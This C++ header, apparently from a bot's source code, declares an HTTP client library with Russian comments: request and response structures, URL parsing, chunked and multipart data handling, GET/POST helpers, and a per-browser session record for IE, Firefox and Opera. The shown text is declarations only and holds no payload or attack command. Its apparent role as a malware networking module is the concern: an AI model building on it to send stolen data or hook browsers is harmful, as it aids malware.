//---------------------------------------------------------------------------
//  Модуль организации работы с HTTP протоколом
//
//  Версия 1.0
//  Модифицирован: 12 января 2011
//---------------------------------------------------------------------------


//---------------------------------------------------------------------------


#ifndef BotHTTPH
#define BotHTTPH

#include <windows.h>

#include "Strings.h"
#include "BotClasses.h"

// Названия основных методов HTTP запроса
const PCHAR HTTPMethodGET = "GET";
const PCHAR HTTPMethodPOST = "POST";
const PCHAR HTTPMethodHEAD = "HEAD";
const PCHAR HTTPMethodPUT = "PUT";
const PCHAR HTTPMethodDELETE = "DELETE";
const PCHAR HTTPMethodLINK = "LINK";
const PCHAR HTTPMethodUNLINK = "UNLINK";
const PCHAR HTTPMethodCONNECT = "CONNECT";
const PCHAR HTTPMethodOPTIONS = "OPTIONS";
const PCHAR HTTPMethodPATCH = "PATCH";
const PCHAR HTTPMethodTRACE = "TRACE";


// Основные версии HTTP протокола
const PCHAR HTTPProtocolVersion_1_0 = "HTTP/1.0";
const PCHAR HTTPProtocolVersion_1_1 = "HTTP/1.1";

const PCHAR ProtocolHTTP  = "http";
const PCHAR ProtocolHTTPS = "https";

// Основные параметры HTTP заголовков
const PCHAR ParamHost = "Host";
const PCHAR ParamReferer = "Referer";
const PCHAR ParamAccept = "Accept";
const PCHAR ParamUserAgent = "User-Agent";
const PCHAR ParamAcceptLanguage = "Accept-Language";
const PCHAR ParamAcceptEncoding = "Accept-Encoding";
const PCHAR ParamContentType = "Content-Type";
const PCHAR ParamContentLength = "Content-Length";
const PCHAR ParamCookie = "Cookie";
const PCHAR ParamProxyConnection = "Proxy-Connection";
const PCHAR ParamRange = "Range";
const PCHAR ParamTransferEncoding = "Transfer-Encoding";
const PCHAR ParamConnection = "Connection";
const PCHAR ParamLocation = "Location";
const PCHAR ParamAcceptRanges = "Accept-Ranges";
const PCHAR ParamContentRange = "Content-Range";



// Разделители строк
const PCHAR LineBreak = "\r\n";
const PCHAR LineBreak2 = "\r\n\r\n";
const PCHAR ValueDelimeter = ": ";
const PCHAR ValueChunked = "chunked";
const PCHAR URLValueDelimeter = "&";

const PCHAR FormDataURLEncoded = "application/x-www-form-urlencoded";
const PCHAR FormDataMultiPart = "multipart/form-data; boundary=";

// Стандартные порты
const WORD PortHTTP = 80;

// Базовые значения параметров
const PCHAR DefaultPath = "/";
const PCHAR DefaultAccept = "*/*";
const PCHAR DefaultAcceptLanguage = "ru";
const PCHAR DefaultConnection = "Close";

// Типы HTTP запросов
enum THTTPMethod {hmUnknown, hmGET, hmPOST, hmHEAD};

// Версия HTTP протокола
enum THTTPProtocol {HTTP_1_0, HTTP_1_1};

enum TPostDataType {pdtUrlEncoded, pdtMultipartFormData};

#define HTTP_CODE_OK 200

// Описание HTTP запроса
typedef struct THTTPRequest
{
	THTTPMethod Method;         // Метод затпроса
	PCHAR Host;                 // Имя запрашиваемого хоста
	PCHAR Path;                 // Путь к документу
    WORD  Port;                 // Порт удалённого сервера
	PCHAR Referer;              // Адрес с которого идёт запрос
	PCHAR Accept;               // Поддерживаемые типы файлов
	PCHAR AcceptLanguage;       // Поддерживаемый язык
	PCHAR ProxyConnection;      // Тип соединения
	PCHAR UserAgent;            // Имя агента который делает запрос
	PCHAR Cookie;               // Отправляемые куки
	PCHAR ContentType;          // Тип отправляемых данных
	DWORD ContentLength;        // Длина отправляемых данных
	LPVOID PostData;	     	// Отправляемые данные
    TPostDataType PostDataType; // Тип пост данных
	PCHAR Connection;           // Описание соединения
	bool UseRange;              // Использовать пакетную загрузку
	DWORD StartRange;           // Для докачки файлов - Стартовый байт
	DWORD EndRange;             // Конечный байт закачки
} *PHTTPRequest;


// Описание ответа HTTP сервера
typedef struct THTTPResponse
{
    PCHAR Protocol;        // Протокол ответа
	DWORD Code;            // Код ответа сервера
    PCHAR ResponseLine;    // Описание кода ответа
	PCHAR ContentType;     // Тип загружаемых данных
	DWORD ContentLength;   // Размер загружаемых данных
	PCHAR AcceptRanges;    // Ответ на порционную закачку
    PCHAR Connection;      // Информация о соединении
	PCHAR Location;        // Адрес переадресации
	DWORD StartRange;      // Начало блока в файле
	DWORD EndRange;        // Конец блока в файле
	DWORD FullSize;        // Полный размер файла
} *PHTTPResponse;


// Описание URL фдреса
typedef struct TURL
{
    PCHAR Protocol;
	PCHAR Host;
	PCHAR Path;
	PCHAR Document;
	PCHAR Arguments;
	PCHAR UserName;
	PCHAR Password;
	WORD Port;
} *PURL;

//----------------------------------------------------------------------------
//  Функции для работы с запросами
//----------------------------------------------------------------------------

// Создать структуру запроса
PHTTPRequest HTTPCreateRequest(PCHAR URL);

// Создать структуру запроса
void HTTPFreeRequest(PHTTPRequest Request);

// Функция очищает структуру HTTP запроса
void HTTPClearRequest(PHTTPRequest Request);

// Функция заполняет не указанные поля структуры запроса стандартными данными
void HTTPInitializeRequest(PHTTPRequest Request);

// Функция разбирает HTTP запрос в структуру
bool ParseHTTPRequest(PCHAR Buf, PHTTPRequest Request);

// Заполнить  структуру запроса данными из адреса
void HTTPSetRequestURL(PHTTPRequest Request, PCHAR URL);

namespace HTTPRequest
{

	// Вункция собирает строку запроса
	PCHAR Build(PHTTPRequest Request);
};


//*****************************************************************************
//  HTTPResponse - Функции для работы с ответами HTTP сервера
//*****************************************************************************
namespace HTTPResponse
{
	//  Create - создать структуру ответа
	PHTTPResponse Create();

	//  Clear - очистить структуру ответа
	void Clear(PHTTPResponse Response);

	//  Free - уничтожить структуру ответа
	void Free(PHTTPResponse Response);

	//  Parse - парсить ответ сервера
	bool Parse(PCHAR Buf, PHTTPResponse Response);
}


//*****************************************************************************
//  Chunks - Методы для работы с передачей данных частями
//*****************************************************************************
typedef struct TChunks
{
	DWORD Size;      // Размер блока
	DWORD Readed;    // Размер прочитанных данных
    bool Completed;  // Признак того, что документ полностью загружен
} *PChunks;

namespace Chunks
{
	// Функция проверяет заголовок ответа и в случае если
	// если значение заголовка Transfer-Encoding = chunked
	// создаёт структуру для работы с загружаемыми данными
	PChunks Initialize(PCHAR HTTPResponse);

	// Функция уничтожает структуру
	void Free(PChunks Chunks);

	//  Обработать блок данных
	//  После обработки буфера значение Size будет изменёно
	void HandleDataBlock(PChunks Chunks, LPBYTE Data, DWORD &Size);

	// Функция получает размер блока и возвращает указатель на его начало
	LPBYTE GetChunkSize(LPBYTE Buf, DWORD BufSize, DWORD &Size);
}


//----------------------------------------------------------------------------
//  Дополнительные функции для работы с HTTP
//----------------------------------------------------------------------------

PCHAR GetMethodStr(THTTPMethod Kind); // получить строку метода по номеру
THTTPMethod GetMethodFromStr(PCHAR Method);

PCHAR URLEncode(PCHAR URL, DWORD URLSize = 0); // Кодировать URL строку
void AddURLParam(PStrings S, PCHAR Name, PCHAR Value, DWORD ValueSize = 0); // кодирует значение и добавляет пару в список

bool ParseURL(PCHAR URL, PURL Rec, bool FullPars = false); // Распарсить URL
void ClearURL(PURL URL);

bool ParseRequestFirstLine(PCHAR Line, PCHAR *Method, PCHAR *Path, PCHAR *ProtVersion);
PCHAR GetURLEncodedPostData(PCHAR Buf);

//*****************************************************************************
//  HTTPParser - Парсер HTTP данных
//*****************************************************************************
namespace HTTPParser
{
	bool ParseResponseLine(PCHAR Buf, PCHAR &Protocol, DWORD &Code, PCHAR &StatusLine);

	// Функция возвращает значение HTTP заголовка
	PCHAR GetHeaderValue(PCHAR Buf, PCHAR Name);
}

//*****************************************************************************
// Методы для работы с HTTP данными
//*****************************************************************************
namespace HTTPUtils
{
    PCHAR DeleteHeaderValue(PCHAR Buf, int &Size, PCHAR Header);
}

//***************************************************************************
//  MultiPartData - Методы для работы с пост данными формата a
//                  multy part form dat
//***************************************************************************


typedef struct TMultiPartData
{
	PList Items;
	PCHAR Boundary;

    DWORD ReadIndex;  // Позиция читаемого элемента
} *PMultiPartData;


enum TMultiItemReadState {mprsUnknown, mprsHeader, mprsData, mprsBoundary, mprsCompleted};

typedef struct TMultiPartItem
{
	PCHAR Name;        // Имя поля
	PCHAR FileName;    // Имя файла
	LPVOID Data;       // Буфер данных
	DWORD Size;        // Размер буфера
	PCHAR ContentType; // Тип контента файла

	// Следующие поля необходимы только для записи данных в сокет
	PCHAR Header;      // Заголовок элемента (для отправки)
	TMultiItemReadState ReadState; // Состояние чтения элемента
	DWORD ReadedSize;  // Размер прочитанных данных
	HANDLE FileHandle; // Идентификатор открытого файла
	PCHAR Boundary;    // Конечная граница элемента
} *PMultiPartItem;



namespace MultiPartData
{
	// Создать структуру данных
	PMultiPartData Create();

	// Уничтожить структуру данных
	void Free(PMultiPartData Data);

	// Добавить бинарные данные
	PMultiPartItem AddBlobField(PMultiPartData Data, PCHAR Name, LPBYTE Value, DWORD ValueSize);

	// Добавить текстовое поле
	PMultiPartItem AddStringField(PMultiPartData Data, PCHAR Name, PCHAR Value);

	// Добавить файл
	PMultiPartItem AddFileField(PMultiPartData Data, PCHAR Name, PCHAR FileName, PCHAR ContentType);

	// Добавить двоичные данные как файл
	PMultiPartItem AddBlobAsFile(PMultiPartData Data, PCHAR Name, PCHAR FileName,
								 PCHAR ContentType, LPBYTE Value, DWORD ValueSize);


	// Функция читаем следующий блок данных.
	// Результат - количество прочитанных байт
	// Примечание - если на вход передать нулевой буфер, то
	// функция вернёт общий размер пост данных
	DWORD Read(PMultiPartData Data, LPBYTE Buffer, DWORD BufferSize);

	// Записать данные в блок памяти
	LPBYTE BuildToBuf(PMultiPartData Data, DWORD &ResultSize);
}


//*****************************************************************************
//  HTTP - методы выполнения HTTP запросов
//*****************************************************************************

namespace HTTP
{
	// Структура описания принимаемых данных
	typedef struct TResponseData
	{
		PCHAR *Buffer;   // Указатель на переменную буфера приёма
		DWORD *Size;     // Указатель на переменную размера принятых данных
		PCHAR *Headers;  // Указатель на переменную хранения заголовоков ответа сервера
        PHTTPResponse Response; // Структура ответа
	}*PResponseData;

	//********************************************************
	//  ExecuteMethod - выполнить HTTP запрос к серверу
	//********************************************************
	bool ExecuteMethod(PHTTPRequest Request, HTTP::PResponseData Response);


	//********************************************************
	//  Get - отправить GET запрос
	//
	//  URL - адрес загружаемой страницы
	//  Buf - Указатель на переменную строки. Переменная будет
	//		  инициализирована во время выполнения функции
	//        Если не указать, то метод не будет дожидаться
	//		  ответа сервера.
	//        Уничтожить функцией StrFree
	//	Size - Указатель на переменную которая получит размер 
	//		   загруженных данных. Если Size равна NULL то 
	//			размер будет проигнорирован.
	//
	//  Результат - Вернёт истину если удалось выполнить
	//		запрос. Код ответа не проверяется
	//********************************************************
	bool Get(PCHAR URL, PCHAR *Buf, DWORD *Size = NULL);
	bool Get(PCHAR URL, PCHAR *Buf, DWORD *Size, PHTTPResponse ResponseRec);



	//********************************************************
	//  Post - отправить GET запрос
	//
	//  URL - адрес загружаемой страницы
	//
	//  Fields - POST данные запроса
	//
	//  Buf - Указатель на переменную строки. Переменная будет
	//		  инициализирована во время выполнения функции
	//        Если не указать, то метод не будет дожидаться
	//		  ответа сервера.
	//        Уничтожить функцией STR::Free
	//
	//  Результат - Вернёт истину если удалось выполнить
	//		запрос. Код ответа не проверяется
	//********************************************************
	bool Post(PCHAR URL, PStrings Fields, PCHAR *Buf);
    bool Post(PCHAR URL, PMultiPartData Fields, PCHAR *Buf);
}



//*****************************************************************************
//
//*****************************************************************************


// Типы браузеров
#define BROWSER_TYPE_IE		1  // Internet Explorer
#define BROWSER_TYPE_FF		2  // Mozilla Firefox
#define BROWSER_TYPE_O		3  // Opera


// Описание сессии загрузки HTML документа
typedef struct THTTPSessionInfo{
	DWORD BrowserType;  // Тип браузера
	PCHAR UserAgent;    // Имя браузера
	PCHAR URL;          // Адрес загружаемого ресурса
} *PHTTPSessionInfo;




//---------------------------------------------------------------------------
#endif
